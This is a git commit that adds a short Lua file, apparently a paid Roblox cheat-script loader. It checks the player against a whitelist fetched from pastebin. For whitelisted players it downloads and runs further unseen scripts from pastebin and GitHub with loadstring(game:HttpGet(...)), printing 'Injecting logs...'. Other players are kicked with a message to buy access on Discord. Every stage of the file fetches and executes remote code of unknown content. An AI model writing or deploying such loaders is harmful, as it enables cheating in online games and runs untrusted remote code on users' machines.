acc4133662a86eec9065c68f5f9470be9b2ee08b
spiderboy764 <109308746+spiderboy764@users.noreply.github.com>
2022-12-18 03:08:08 -0600

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,19 @@
+local USERTable = loadstring(game:HttpGet("https://pastebin.com/3FY8gW53", true))()
+if _G.Key == 1 then
+    if USERTable[game.Players.LocalPlayer.Name] then
+        _G.Key = 2
+        print(_G.Key)
+        loadstring(game:HttpGet("https://pastebin.com/raw/mCCUSYeQ", true))()
+        print("Whitelisted Script")
+        print("Injecting logs...")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tnbian/ruin/main/dontskidlol", true))()
+    else
+        plr:kick("Buy at https://discord.gg/YDzcEh6YuU")
+    end
+end
+
+if _G.Key == 2 then
+    print(_G.Key)
+else
+    print("Join us at https://discord.gg/YDzcEh6YuU")
+end
